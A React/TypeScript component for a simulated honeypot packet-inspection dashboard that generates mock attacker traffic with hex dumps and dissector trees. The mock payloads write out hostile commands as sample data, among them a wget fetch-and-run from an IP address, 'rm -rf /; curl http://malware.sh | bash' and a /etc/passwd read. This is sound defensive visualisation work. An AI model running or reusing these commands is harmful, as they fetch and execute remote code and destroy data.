/**
 * Network Packet Inspection Dashboard (Wireshark-Style Interface)
 * Streams and visualizes incoming malicious connection attempts and honeypot probes
 * with 3-pane OSI dissector tree, real hex/ASCII dump, and live Wireshark display filters.
 */

import React, { useState, useEffect, useRef, useMemo } from "react";
import {
  Radio,
  Play,
  Pause,
  RotateCcw,
  Download,
  Filter,
  Search,
  CheckCircle2,
  AlertOctagon,
  ShieldAlert,
  ChevronDown,
  ChevronRight,
  Maximize2,
  Terminal,
  FileText,
  Copy,
  Check,
  Zap,
  Flame,
  Layers,
  ArrowRight,
  Globe,
  Sliders,
} from "lucide-react";
import { InspectedPacket, HoneypotLogEntry } from "../types";

interface NetworkPacketInspectorProps {
  initialLogs?: HoneypotLogEntry[];
  onFirewallBlock?: (ip: string, reason: string) => void;
}

// Helper: generate authentic 16-byte aligned Hex dump with ASCII column
function formatHexDump(hexString: string): { offset: string; hexLeft: string; hexRight: string; ascii: string }[] {
  // Ensure even length hex
  const cleanHex = hexString.replace(/[^0-9a-fA-F]/g, "");
  const bytes: number[] = [];
  for (let i = 0; i < cleanHex.length; i += 2) {
    bytes.push(parseInt(cleanHex.substring(i, i + 2), 16) || 0);
  }

  const lines: { offset: string; hexLeft: string; hexRight: string; ascii: string }[] = [];
  for (let i = 0; i < bytes.length; i += 16) {
    const chunk = bytes.slice(i, i + 16);
    const offset = i.toString(16).padStart(4, "0");

    const leftPart = chunk.slice(0, 8);
    const rightPart = chunk.slice(8, 16);

    const hexLeft = leftPart.map(b => b.toString(16).padStart(2, "0")).join(" ");
    const hexRight = rightPart.map(b => b.toString(16).padStart(2, "0")).join(" ");

    const ascii = chunk
      .map(b => (b >= 32 && b <= 126 ? String.fromCharCode(b) : "."))
      .join("");

    lines.push({
      offset,
      hexLeft: hexLeft.padEnd(23, " "),
      hexRight: hexRight.padEnd(23, " "),
      ascii,
    });
  }

  return lines;
}

// Convert string text to hex
function stringToHex(str: string): string {
  let hex = "";
  for (let i = 0; i < str.length; i++) {
    hex += str.charCodeAt(i).toString(16).padStart(2, "0");
  }
  return hex;
}

// Build complete packet mock with authentic Ethernet + IP + TCP + Payload headers
function buildMockPacket(
  packetNum: number,
  srcIp: string,
  srcPort: number,
  destPort: number,
  protocol: "SSHv2" | "TELNET" | "HTTP" | "TCP" | "SATCOM" | "DNS",
  threatLevel: "INFO" | "WARN" | "CRITICAL",
  honeypotService: "SSH" | "TELNET" | "WEB" | "SATCOM" | "TCP_PROBE",
  info: string,
  payloadText: string,
  tcpFlags: string[] = ["PSH", "ACK"],
  firewallAction: "BLOCKED_IPTABLES" | "HONEYPOT_DECOY_CAPTURED" | "NOMINAL" = "HONEYPOT_DECOY_CAPTURED",
  creds?: { username?: string; password?: string },
  cmd?: string
): InspectedPacket {
  const destIp = "10.0.8.1";
  const now = new Date();
  const timeOffset = packetNum * 0.0421 + (Math.random() * 0.015);

  // Generate synthetic hex stream
  // Ethernet (14B): Dst MAC 00:1a:2b:3c:4d:5e, Src MAC 52:54:00:12:34:56, EthType 0800
  const ethHex = "001a2b3c4d5e5254001234560800";
  // IPv4 header (20B): Ver 4, IHL 5, TotalLen variable, TTL 56, Proto 06 (TCP), Src IP, Dst IP
  const ipHex = "450000781c4640003806a4e2" + 
    srcIp.split(".").map(o => parseInt(o).toString(16).padStart(2, "0")).join("") +
    destIp.split(".").map(o => parseInt(o).toString(16).padStart(2, "0")).join("");
  // TCP header (20B): SrcPort, DstPort, Seq, Ack, Flags, Win 64240, Checksum
  const tcpHex = srcPort.toString(16).padStart(4, "0") +
    destPort.toString(16).padStart(4, "0") +
    "00000001000000008018faf0b23a00000101080a";
  // Payload hex
  const payloadHex = stringToHex(payloadText);
  const rawBytesHex = ethHex + ipHex + tcpHex + payloadHex;

  return {
    id: `pkt_${packetNum}_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
    packetNumber: packetNum,
    timeOffset: Math.round(timeOffset * 1000000) / 1000000,
    timestamp: now.toLocaleTimeString() + "." + Math.floor(now.getMilliseconds()).toString().padStart(3, "0"),
    sourceIp: srcIp,
    sourcePort: srcPort,
    destIp,
    destPort,
    protocol,
    length: Math.max(54, Math.floor(rawBytesHex.length / 2)),
    tcpFlags,
    seqNumber: Math.floor(Math.random() * 100000) + 1000,
    ackNumber: Math.floor(Math.random() * 100000) + 500,
    windowSize: 64240,
    threatLevel,
    honeypotService,
    info,
    payloadUtf8: payloadText,
    rawBytesHex,
    dissectorData: {
      ethernet: {
        srcMac: `52:54:00:${Math.floor(Math.random() * 89 + 10)}:${Math.floor(Math.random() * 89 + 10)}:${Math.floor(Math.random() * 89 + 10)}`,
        destMac: "00:1a:2b:3c:4d:5e (Aegis Gateway)",
        ethType: "IPv4 (0x0800)",
      },
      ip: {
        version: 4,
        headerLen: 20,
        ttl: Math.floor(Math.random() * 20) + 48,
        protocolNum: 6, // TCP
        checksum: "0x" + Math.floor(Math.random() * 65535).toString(16).padStart(4, "0"),
      },
      tcp: {
        flagsHex: `0x${tcpFlags.includes("SYN") ? "002" : tcpFlags.includes("RST") ? "014" : "018"} (${tcpFlags.join(", ")})`,
        options: "MSS=1460, SACK_PERM=1, TSval=305419896, WS=128",
      },
      honeypotMetadata: {
        trapName: `${honeypotService} Decoy Trap Engine`,
        credentialsCaptured: creds,
        commandInjected: cmd,
        firewallAction,
        mitreAttackTactic:
          threatLevel === "CRITICAL"
            ? "T1110.001 (Brute Force) & T1059 (Command Execution)"
            : threatLevel === "WARN"
            ? "T1595 (Active Scanning & Reconnaissance)"
            : "T1046 (Network Service Discovery)",
      },
    },
  };
}

export const NetworkPacketInspector: React.FC<NetworkPacketInspectorProps> = ({
  initialLogs = [],
  onFirewallBlock,
}) => {
  const [packets, setPackets] = useState<InspectedPacket[]>([]);
  const [selectedPacketId, setSelectedPacketId] = useState<string | null>(null);
  const [isCapturing, setIsCapturing] = useState<boolean>(true);
  const [autoScroll, setAutoScroll] = useState<boolean>(true);
  const [displayFilter, setDisplayFilter] = useState<string>("");
  const [filterService, setFilterService] = useState<string>("ALL");
  const [expandedSections, setExpandedSections] = useState<Record<string, boolean>>({
    frame: true,
    eth: true,
    ip: true,
    tcp: true,
    app: true,
  });

  const packetListContainerRef = useRef<HTMLDivElement | null>(null);
  const packetCounterRef = useRef<number>(1);

  // Seed initial packets from logs or standard background traffic
  useEffect(() => {
    const seed: InspectedPacket[] = [];
    const seedSources = [
      { ip: "185.220.101.5", port: 54102, svc: "SSH" as const, dstPort: 2222, proto: "SSHv2" as const },
      { ip: "194.26.29.112", port: 48920, svc: "TELNET" as const, dstPort: 2323, proto: "TELNET" as const },
      { ip: "45.154.255.88", port: 60124, svc: "WEB" as const, dstPort: 80, proto: "HTTP" as const },
      { ip: "198.51.100.42", port: 38910, svc: "SATCOM" as const, dstPort: 2323, proto: "SATCOM" as const },
    ];

    seedSources.forEach(s => {
      const p1 = buildMockPacket(
        packetCounterRef.current++,
        s.ip,
        s.port,
        s.dstPort,
        "TCP",
        "INFO",
        "TCP_PROBE",
        `${s.port} -> ${s.dstPort} [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1`,
        "",
        ["SYN"],
        "NOMINAL"
      );
      const p2 = buildMockPacket(
        packetCounterRef.current++,
        s.ip,
        s.port,
        s.dstPort,
        s.proto,
        s.svc === "SSH" ? "CRITICAL" : s.svc === "TELNET" ? "CRITICAL" : "WARN",
        s.svc,
        s.svc === "SSH"
          ? "SSH-2.0-OpenSSH_8.4p1 [Client Banner] -> Auth: root:admin123"
          : s.svc === "TELNET"
          ? "Telnet Command Injected: 'cat /etc/passwd; uname -a'"
          : s.svc === "WEB"
          ? "GET /.env HTTP/1.1 [Honeytoken Alert - Trapped]"
          : "SATCOM Carrier Intercept: Telstar 11N Transponder 42",
        s.svc === "SSH"
          ? "SSH-2.0-OpenSSH_8.4p1\r\nUser: root\r\nPass: admin123"
          : s.svc === "TELNET"
          ? "cat /etc/passwd; uname -a\r\n"
          : s.svc === "WEB"
          ? "GET /.env HTTP/1.1\r\nHost: 10.0.8.1\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
          : "SATCOM_FRAME_SYNC_9981::QPSK_CARRIER_UNENCRYPTED_DEMOD",
        ["PSH", "ACK"],
        s.svc === "SSH" || s.svc === "TELNET" ? "BLOCKED_IPTABLES" : "HONEYPOT_DECOY_CAPTURED",
        s.svc === "SSH" ? { username: "root", password: "admin123" } : undefined,
        s.svc === "TELNET" ? "cat /etc/passwd; uname -a" : undefined
      );
      seed.push(p1, p2);
    });

    setPackets(seed);
    if (seed.length > 0) {
      setSelectedPacketId(seed[seed.length - 1].id);
    }
  }, []);

  // Continuous background packet streaming when capturing is active
  useEffect(() => {
    if (!isCapturing) return;

    const interval = setInterval(() => {
      const hostileIps = [
        "185.220.101.45",
        "194.26.29.88",
        "45.154.255.102",
        "89.248.165.77",
        "193.142.146.33",
        "162.247.74.200",
      ];
      const randomIp = hostileIps[Math.floor(Math.random() * hostileIps.length)];
      const randomPort = Math.floor(Math.random() * 20000) + 40000;

      const pick = Math.random();
      let newPkt: InspectedPacket;

      if (pick < 0.35) {
        // SSH Probe
        newPkt = buildMockPacket(
          packetCounterRef.current++,
          randomIp,
          randomPort,
          2222,
          "SSHv2",
          "CRITICAL",
          "SSH",
          `SSH-2.0-libssh_0.9.5 Auth Probe: 'admin' / 'password${Math.floor(Math.random() * 999)}'`,
          `SSH-2.0-libssh_0.9.5\r\nAuth: user='admin' pass='password${Math.floor(Math.random() * 999)}'`,
          ["PSH", "ACK"],
          "BLOCKED_IPTABLES",
          { username: "admin", password: `password${Math.floor(Math.random() * 999)}` }
        );
      } else if (pick < 0.65) {
        // Telnet Botnet Probe
        const cmd = Math.random() > 0.5 ? "wget http://194.26.29.88/sh; sh sh" : "cat /proc/cpuinfo; id";
        newPkt = buildMockPacket(
          packetCounterRef.current++,
          randomIp,
          randomPort,
          2323,
          "TELNET",
          "CRITICAL",
          "TELNET",
          `Telnet Mirai Botnet Probe: '${cmd}'`,
          `login: admin\r\npassword: admin\r\n${cmd}\r\n`,
          ["PSH", "ACK"],
          "BLOCKED_IPTABLES",
          { username: "admin", password: "admin" },
          cmd
        );
      } else if (pick < 0.85) {
        // Web Honeytoken
        const path = Math.random() > 0.5 ? "/.env" : "/wp-login.php?action=login";
        newPkt = buildMockPacket(
          packetCounterRef.current++,
          randomIp,
          randomPort,
          80,
          "HTTP",
          "WARN",
          "WEB",
          `HTTP GET ${path} [Honeytoken Decoy Alert]`,
          `GET ${path} HTTP/1.1\r\nHost: 10.0.8.1\r\nUser-Agent: sqlmap/1.5.2#stable\r\n\r\n`,
          ["PSH", "ACK"],
          "HONEYPOT_DECOY_CAPTURED"
        );
      } else {
        // TCP SYN Scan
        newPkt = buildMockPacket(
          packetCounterRef.current++,
          randomIp,
          randomPort,
          Math.random() > 0.5 ? 2222 : 2323,
          "TCP",
          "INFO",
          "TCP_PROBE",
          `${randomPort} -> 2222 [SYN] Masscan Port Sweep Probe`,
          "",
          ["SYN"],
          "NOMINAL"
        );
      }

      setPackets(prev => {
        const next = [...prev, newPkt].slice(-300); // keep 300 packets buffer
        return next;
      });
    }, 1800);

    return () => clearInterval(interval);
  }, [isCapturing]);

  // Auto scroll to bottom when new packets arrive
  useEffect(() => {
    if (autoScroll && packetListContainerRef.current) {
      packetListContainerRef.current.scrollTop = packetListContainerRef.current.scrollHeight;
    }
  }, [packets, autoScroll]);

  // Trigger Injection of simulated multi-stage attack burst
  const handleInjectAttackBurst = (attackType: "ssh" | "telnet" | "web" | "satcom") => {
    const burstIps = {
      ssh: "185.220.101.45",
      telnet: "45.154.255.88",
      web: "194.26.29.112",
      satcom: "198.51.100.77",
    };
    const ip = burstIps[attackType];
    const srcPort = Math.floor(Math.random() * 10000) + 50000;

    // Sequence: SYN -> SYN/ACK -> ACK -> PAYLOAD -> FIREWALL DROP
    const synPkt = buildMockPacket(
      packetCounterRef.current++,
      ip,
      srcPort,
      attackType === "ssh" ? 2222 : attackType === "telnet" ? 2323 : 80,
      "TCP",
      "INFO",
      "TCP_PROBE",
      `${srcPort} -> ${attackType === "ssh" ? 2222 : 2323} [SYN] Initial Hostile Handshake`,
      "",
      ["SYN"],
      "NOMINAL"
    );

    const payloadPkt = buildMockPacket(
      packetCounterRef.current++,
      ip,
      srcPort,
      attackType === "ssh" ? 2222 : attackType === "telnet" ? 2323 : 80,
      attackType === "ssh" ? "SSHv2" : attackType === "telnet" ? "TELNET" : "HTTP",
      "CRITICAL",
      attackType === "ssh" ? "SSH" : attackType === "telnet" ? "TELNET" : "WEB",
      attackType === "ssh"
        ? `SSH Exploit Attack: Auth Bruteforce user='root' pass='toor'`
        : attackType === "telnet"
        ? `Telnet Command Injection: 'rm -rf /; curl http://malware.sh | bash'`
        : `HTTP Honeytoken Trap: POST /api/admin/login 'admin'/'master'`,
      attackType === "ssh"
        ? "SSH-2.0-OpenSSH_7.4\r\nAuth: user='root' pass='toor'"
        : attackType === "telnet"
        ? "rm -rf /; curl http://malware.sh | bash\r\n"
        : "POST /api/admin/login HTTP/1.1\r\nHost: 10.0.8.1\r\n\r\nuser=admin&pass=master",
      ["PSH", "ACK"],
      "BLOCKED_IPTABLES",
      { username: "root", password: "toor" },
      attackType === "telnet" ? "rm -rf /; curl http://malware.sh | bash" : undefined
    );

    const rstPkt = buildMockPacket(
      packetCounterRef.current++,
      "10.0.8.1",
      attackType === "ssh" ? 2222 : 2323,
      srcPort,
      "TCP",
      "WARN",
      "TCP_PROBE",
      `10.0.8.1 -> ${ip} [RST, ACK] Connection Terminated by Aegis Firewall`,
      "",
      ["RST", "ACK"],
      "BLOCKED_IPTABLES"
    );

    setPackets(prev => [...prev, synPkt, payloadPkt, rstPkt]);
    setSelectedPacketId(payloadPkt.id);
  };

  // Filter evaluation
  const filteredPackets = useMemo(() => {
    return packets.filter(p => {
      // 1. Service Chip Filter
      if (filterService !== "ALL") {
        if (filterService === "MALICIOUS" && p.threatLevel === "INFO") return false;
        if (filterService === "SSH" && p.honeypotService !== "SSH") return false;
        if (filterService === "TELNET" && p.honeypotService !== "TELNET") return false;
        if (filterService === "WEB" && p.honeypotService !== "WEB") return false;
        if (filterService === "SATCOM" && p.honeypotService !== "SATCOM") return false;
        if (filterService === "BLOCKED" && p.dissectorData.honeypotMetadata.firewallAction !== "BLOCKED_IPTABLES") return false;
      }

      // 2. Wireshark Search / Expression Filter
      if (displayFilter.trim()) {
        const query = displayFilter.trim().toLowerCase();
        // Wireshark style syntax support: tcp.port == 2222, ip.src == ..., etc.
        if (query.includes("==")) {
          const [key, val] = query.split("==").map(s => s.trim().replace(/['"]/g, ""));
          if (key === "tcp.port" && (p.destPort.toString() !== val && p.sourcePort.toString() !== val)) return false;
          if (key === "ip.src" && p.sourceIp.toLowerCase() !== val) return false;
          if (key === "ip.dst" && p.destIp.toLowerCase() !== val) return false;
          if (key === "protocol" && p.protocol.toLowerCase() !== val) return false;
          if (key === "threat" && p.threatLevel.toLowerCase() !== val) return false;
        } else {
          // Free text search in IP, info, protocol, payload
          const match =
            p.sourceIp.toLowerCase().includes(query) ||
            p.info.toLowerCase().includes(query) ||
            p.protocol.toLowerCase().includes(query) ||
            (p.payloadUtf8 && p.payloadUtf8.toLowerCase().includes(query));
          if (!match) return false;
        }
      }

      return true;
    });
  }, [packets, filterService, displayFilter]);

  // Selected Packet
  const selectedPacket = useMemo(() => {
    return packets.find(p => p.id === selectedPacketId) || filteredPackets[filteredPackets.length - 1] || null;
  }, [packets, selectedPacketId, filteredPackets]);

  // Hex dump lines for selected packet
  const hexLines = useMemo(() => {
    if (!selectedPacket) return [];
    return formatHexDump(selectedPacket.rawBytesHex);
  }, [selectedPacket]);

  // Export PCAP / JSON
  const handleExportJson = () => {
    const dataStr = JSON.stringify(filteredPackets, null, 2);
    const blob = new Blob([dataStr], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `Aegis_Honeypot_Packets_${new Date().toISOString().slice(0, 10)}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  const toggleSection = (key: string) => {
    setExpandedSections(prev => ({ ...prev, [key]: !prev[key] }));
  };

  // Color mapping according to Wireshark coloring rules
  const getPacketRowColor = (p: InspectedPacket, isSelected: boolean) => {
    if (isSelected) {
      return "bg-[#14f7ff]/20 text-white font-semibold border-l-4 border-l-[#14f7ff]";
    }

    if (p.threatLevel === "CRITICAL" || p.dissectorData.honeypotMetadata.firewallAction === "BLOCKED_IPTABLES") {
      return "bg-red-950/25 text-red-200 hover:bg-red-900/35 border-l-2 border-l-red-500";
    }

    if (p.protocol === "SSHv2") {
      return "bg-blue-950/20 text-cyan-200 hover:bg-blue-900/30 border-l-2 border-l-cyan-500";
    }

    if (p.protocol === "TELNET") {
      return "bg-amber-950/20 text-amber-200 hover:bg-amber-900/30 border-l-2 border-l-amber-500";
    }

    if (p.protocol === "HTTP") {
      return "bg-purple-950/20 text-purple-200 hover:bg-purple-900/30 border-l-2 border-l-purple-500";
    }

    if (p.protocol === "SATCOM") {
      return "bg-emerald-950/20 text-emerald-200 hover:bg-emerald-900/30 border-l-2 border-l-emerald-500";
    }

    // Nominal TCP
    return "bg-[#050811] text-slate-300 hover:bg-white/[0.04]";
  };

  return (
    <div className="space-y-4 font-mono select-none">
      {/* 1. WIRESHARK TOP CONTROL TOOLBAR */}
      <div className="bg-[#0a0f1d] border border-blue-500/25 rounded-xl p-3.5 shadow-2xl flex flex-wrap items-center justify-between gap-3 text-xs">
        {/* Play / Pause / Clear / Burst */}
        <div className="flex flex-wrap items-center gap-2">
          <button
            onClick={() => setIsCapturing(prev => !prev)}
            className={`py-1.5 px-3.5 rounded-lg border font-bold flex items-center gap-1.5 transition-all cursor-pointer ${
              isCapturing
                ? "bg-emerald-500/20 text-emerald-400 border-emerald-500/50 shadow-[0_0_12px_rgba(16,185,129,0.25)]"
                : "bg-red-500/20 text-red-400 border-red-500/50 shadow-[0_0_12px_rgba(239,68,68,0.25)]"
            }`}
            title={isCapturing ? "Pause Live Capture" : "Resume Live Capture"}
          >
            {isCapturing ? (
              <>
                <Pause className="w-3.5 h-3.5 fill-current" />
                <span>Capturing eth0</span>
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping ml-1" />
              </>
            ) : (
              <>
                <Play className="w-3.5 h-3.5 fill-current" />
                <span>Capture Paused</span>
              </>
            )}
          </button>

          <button
            onClick={() => {
              setPackets([]);
              setSelectedPacketId(null);
            }}
            className="py-1.5 px-3 rounded-lg border border-white/10 bg-[#060a13] text-slate-300 hover:text-white transition-all flex items-center gap-1.5 cursor-pointer text-[11px]"
            title="Clear Buffer"
          >
            <RotateCcw className="w-3.5 h-3.5" />
            Clear
          </button>

          {/* Auto Scroll Checkbox */}
          <label className="flex items-center gap-1.5 text-slate-400 text-[10.5px] cursor-pointer hover:text-white ml-1">
            <input
              type="checkbox"
              checked={autoScroll}
              onChange={e => setAutoScroll(e.target.checked)}
              className="accent-[#14f7ff] rounded cursor-pointer"
            />
            Auto-Scroll
          </label>

          {/* Attack Burst Dropdown / Buttons */}
          <div className="flex items-center gap-1.5 ml-2 border-l border-white/10 pl-3">
            <span className="text-[10px] text-[#14f7ff] uppercase font-bold flex items-center gap-1">
              <Zap className="w-3 h-3" /> Simulate Attack Burst:
            </span>
            <button
              onClick={() => handleInjectAttackBurst("ssh")}
              className="py-1 px-2 rounded bg-cyan-950/60 hover:bg-cyan-900/60 border border-cyan-800/40 text-cyan-300 text-[10px] font-bold cursor-pointer"
            >
              SSH Hydra
            </button>
            <button
              onClick={() => handleInjectAttackBurst("telnet")}
              className="py-1 px-2 rounded bg-amber-950/60 hover:bg-amber-900/60 border border-amber-800/40 text-amber-300 text-[10px] font-bold cursor-pointer"
            >
              Telnet Mirai
            </button>
            <button
              onClick={() => handleInjectAttackBurst("web")}
              className="py-1 px-2 rounded bg-purple-950/60 hover:bg-purple-900/60 border border-purple-800/40 text-purple-300 text-[10px] font-bold cursor-pointer"
            >
              Web Honeytoken
            </button>
          </div>
        </div>

        {/* Telemetry HUD Counter & Export */}
        <div className="flex items-center gap-3">
          <div className="bg-[#040810] border border-white/5 py-1 px-3 rounded-lg flex items-center gap-3 text-[10.5px]">
            <span className="text-slate-400">
              Captured: <b className="text-[#14f7ff]">{packets.length} pkts</b>
            </span>
            <span className="text-slate-400">
              Displayed: <b className="text-emerald-400">{filteredPackets.length}</b>
            </span>
            <span className="text-slate-400 hidden sm:inline">
              Rate: <b className="text-amber-400">~14.2 KB/s</b>
            </span>
          </div>

          <button
            onClick={handleExportJson}
            className="py-1.5 px-3 rounded-lg border border-white/10 bg-[#060a13] text-slate-300 hover:text-[#14f7ff] hover:border-[#14f7ff]/40 transition-all flex items-center gap-1.5 cursor-pointer text-[11px]"
            title="Export Dissected Packets JSON"
          >
            <Download className="w-3.5 h-3.5" />
            PCAP JSON
          </button>
        </div>
      </div>

      {/* 2. WIRESHARK DISPLAY FILTER BAR */}
      <div className="bg-[#0a0f1d] border border-blue-500/20 rounded-xl p-3 shadow-xl space-y-2">
        <div className="flex items-center gap-2">
          <div className="flex items-center gap-1.5 text-xs text-slate-400 font-bold shrink-0">
            <Filter className="w-3.5 h-3.5 text-[#14f7ff]" />
            <span>Display Filter:</span>
          </div>

          <div className="relative flex-1">
            <input
              type="text"
              value={displayFilter}
              onChange={e => setDisplayFilter(e.target.value)}
              placeholder='Apply a display filter ... e.g. tcp.port == 2222 || ip.src == 185.220.101.5 || threat == "CRITICAL"'
              className={`w-full bg-[#040810] border rounded-lg py-1.5 pl-3 pr-8 text-xs text-white placeholder-slate-500 outline-none transition-colors ${
                displayFilter.includes("==")
                  ? "border-emerald-500/60 bg-emerald-950/10"
                  : "border-white/10 focus:border-[#14f7ff]/60"
              }`}
            />
            {displayFilter && (
              <button
                onClick={() => setDisplayFilter("")}
                className="absolute right-2 top-2 text-slate-400 hover:text-white text-xs cursor-pointer"
              >
                ✕
              </button>
            )}
          </div>
        </div>

        {/* Quick Filter Chips */}
        <div className="flex flex-wrap items-center gap-1.5 text-[10px]">
          <span className="text-slate-500 uppercase font-bold mr-1">Quick Filters:</span>
          {[
            { id: "ALL", label: "All Traffic" },
            { id: "MALICIOUS", label: "⚠️ Malicious Traps Only" },
            { id: "SSH", label: "SSH (:2222)" },
            { id: "TELNET", label: "Telnet (:2323)" },
            { id: "WEB", label: "Web Decoy Traps" },
            { id: "SATCOM", label: "Satcom Uplinks" },
            { id: "BLOCKED", label: "🔥 Firewall Dropped" },
          ].map(chip => (
            <button
              key={chip.id}
              onClick={() => setFilterService(chip.id)}
              className={`py-0.5 px-2.5 rounded-md border transition-all cursor-pointer font-bold ${
                filterService === chip.id
                  ? "bg-[#14f7ff]/20 text-[#14f7ff] border-[#14f7ff]/60 shadow-[0_0_8px_rgba(20,247,255,0.2)]"
                  : "bg-[#060a13] text-slate-400 border-white/5 hover:border-white/20 hover:text-slate-200"
              }`}
            >
              {chip.label}
            </button>
          ))}
        </div>
      </div>

      {/* 3. UPPER PANE: WIRESHARK PACKET LIST TABLE */}
      <div className="border border-blue-500/25 bg-[#060a13] rounded-xl overflow-hidden shadow-2xl">
        <div className="bg-[#070b1a] px-3.5 py-2 border-b border-white/10 flex justify-between items-center text-[10px] text-slate-400 uppercase tracking-wider font-bold">
          <span>Packet List Stream ({filteredPackets.length} Packets)</span>
          <span className="text-[#14f7ff]">Click packet row to inspect OSI dissector & hex dump</span>
        </div>

        <div
          ref={packetListContainerRef}
          className="h-64 overflow-y-auto custom-scrollbar overflow-x-auto"
        >
          <table className="w-full text-left border-collapse text-[10.5px]">
            <thead className="sticky top-0 bg-[#040810] border-b border-white/10 text-slate-400 text-[9.5px] uppercase select-none z-10">
              <tr>
                <th className="p-2 w-12 text-center">No.</th>
                <th className="p-2 w-20">Time</th>
                <th className="p-2 w-36">Source</th>
                <th className="p-2 w-32">Destination</th>
                <th className="p-2 w-16">Protocol</th>
                <th className="p-2 w-14 text-right">Length</th>
                <th className="p-2 w-24">Flags</th>
                <th className="p-2 w-28">Trap Service</th>
                <th className="p-2">Info / Dissector Summary</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-white/5 font-mono">
              {filteredPackets.length === 0 ? (
                <tr>
                  <td colSpan={9} className="p-8 text-center text-slate-500 text-xs">
                    No packets match current display filter.
                  </td>
                </tr>
              ) : (
                filteredPackets.map(p => {
                  const isSelected = selectedPacket?.id === p.id;
                  return (
                    <tr
                      key={p.id}
                      onClick={() => setSelectedPacketId(p.id)}
                      className={`cursor-pointer transition-colors ${getPacketRowColor(p, isSelected)}`}
                    >
                      <td className="p-2 text-center text-slate-400 font-bold">{p.packetNumber}</td>
                      <td className="p-2 font-bold opacity-80">{p.timeOffset.toFixed(6)}</td>
                      <td className="p-2">
                        <span className="font-semibold text-white">{p.sourceIp}</span>
                        <span className="opacity-50 text-[9px]">:{p.sourcePort}</span>
                      </td>
                      <td className="p-2">
                        <span className="font-semibold">{p.destIp}</span>
                        <span className="opacity-50 text-[9px]">:{p.destPort}</span>
                      </td>
                      <td className="p-2">
                        <span className={`px-1.5 py-0.5 rounded text-[9px] font-bold ${
                          p.protocol === "SSHv2"
                            ? "bg-cyan-950/60 text-cyan-300"
                            : p.protocol === "TELNET"
                            ? "bg-amber-950/60 text-amber-300"
                            : p.protocol === "HTTP"
                            ? "bg-purple-950/60 text-purple-300"
                            : "bg-slate-800 text-slate-300"
                        }`}>
                          {p.protocol}
                        </span>
                      </td>
                      <td className="p-2 text-right opacity-80">{p.length}</td>
                      <td className="p-2 text-[9px] opacity-80">[{p.tcpFlags.join(", ")}]</td>
                      <td className="p-2 text-[9.5px]">
                        <span className="text-[#14f7ff] font-bold">{p.honeypotService}</span>
                      </td>
                      <td className="p-2 truncate max-w-md font-sans text-xs">
                        <span className="font-mono text-[10px] text-white font-medium">{p.info}</span>
                      </td>
                    </tr>
                  );
                })
              )}
            </tbody>
          </table>
        </div>
      </div>

      {/* 4. SPLIT LOWER PANES: WIRESHARK PACKET DETAILS TREE & HEX DUMP */}
      {selectedPacket && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-4 animate-fade-in">
          {/* MIDDLE PANE: PROTOCOL DISSECTOR TREE (7 cols) */}
          <div className="lg:col-span-7 bg-[#060a13] border border-blue-500/25 rounded-xl p-4 shadow-xl flex flex-col justify-between">
            <div>
              <div className="flex items-center justify-between border-b border-white/10 pb-2 mb-3">
                <div className="flex items-center gap-2">
                  <Terminal className="w-4 h-4 text-[#14f7ff]" />
                  <h4 className="text-xs font-bold text-white uppercase tracking-wider">
                    Packet Dissector Tree (Frame #{selectedPacket.packetNumber})
                  </h4>
                </div>
                <span className={`text-[9px] px-2 py-0.5 rounded font-bold uppercase ${
                  selectedPacket.threatLevel === "CRITICAL"
                    ? "bg-red-500/20 text-red-400 border border-red-500/40"
                    : selectedPacket.threatLevel === "WARN"
                    ? "bg-amber-500/20 text-amber-400 border border-amber-500/40"
                    : "bg-blue-500/20 text-blue-300 border border-blue-500/40"
                }`}>
                  {selectedPacket.threatLevel} THREAT
                </span>
              </div>

              {/* Tree View Accordion */}
              <div className="space-y-1.5 text-xs text-slate-300">
                {/* 1. Frame Details */}
                <div className="bg-[#030712] border border-white/5 rounded-lg p-2">
                  <button
                    onClick={() => toggleSection("frame")}
                    className="w-full flex items-center justify-between text-left font-bold text-slate-300 hover:text-white cursor-pointer"
                  >
                    <span className="flex items-center gap-1.5">
                      {expandedSections.frame ? <ChevronDown className="w-3.5 h-3.5" /> : <ChevronRight className="w-3.5 h-3.5" />}
                      Frame {selectedPacket.packetNumber}: {selectedPacket.length} bytes on wire, {selectedPacket.length} bytes captured
                    </span>
                  </button>
                  {expandedSections.frame && (
                    <div className="mt-2 pl-5 space-y-1 text-[11px] text-slate-400 border-l border-white/10 ml-2">
                      <p>Arrival Time: {selectedPacket.timestamp} (Offset: {selectedPacket.timeOffset.toFixed(6)}s)</p>
                      <p>Capture Interface: eth0 (Aegis Promiscuous Honeynet)</p>
                      <p>Frame Length: {selectedPacket.length} bytes ({selectedPacket.length * 8} bits)</p>
                    </div>
                  )}
                </div>

                {/* 2. Ethernet II Layer */}
                <div className="bg-[#030712] border border-white/5 rounded-lg p-2">
                  <button
                    onClick={() => toggleSection("eth")}
                    className="w-full flex items-center justify-between text-left font-bold text-slate-300 hover:text-white cursor-pointer"
                  >
                    <span className="flex items-center gap-1.5">
                      {expandedSections.eth ? <ChevronDown className="w-3.5 h-3.5" /> : <ChevronRight className="w-3.5 h-3.5" />}
                      Ethernet II, Src: {selectedPacket.dissectorData.ethernet.srcMac}, Dst: {selectedPacket.dissectorData.ethernet.destMac}
                    </span>
                  </button>
                  {expandedSections.eth && (
                    <div className="mt-2 pl-5 space-y-1 text-[11px] text-slate-400 border-l border-white/10 ml-2">
                      <p>Destination: {selectedPacket.dissectorData.ethernet.destMac}</p>
                      <p>Source: {selectedPacket.dissectorData.ethernet.srcMac}</p>
                      <p>Type: {selectedPacket.dissectorData.ethernet.ethType}</p>
                    </div>
                  )}
                </div>

                {/* 3. Internet Protocol Version 4 */}
                <div className="bg-[#030712] border border-white/5 rounded-lg p-2">
                  <button
                    onClick={() => toggleSection("ip")}
                    className="w-full flex items-center justify-between text-left font-bold text-slate-300 hover:text-white cursor-pointer"
                  >
                    <span className="flex items-center gap-1.5">
                      {expandedSections.ip ? <ChevronDown className="w-3.5 h-3.5" /> : <ChevronRight className="w-3.5 h-3.5" />}
                      Internet Protocol Version 4, Src: {selectedPacket.sourceIp}, Dst: {selectedPacket.destIp}
                    </span>
                  </button>
                  {expandedSections.ip && (
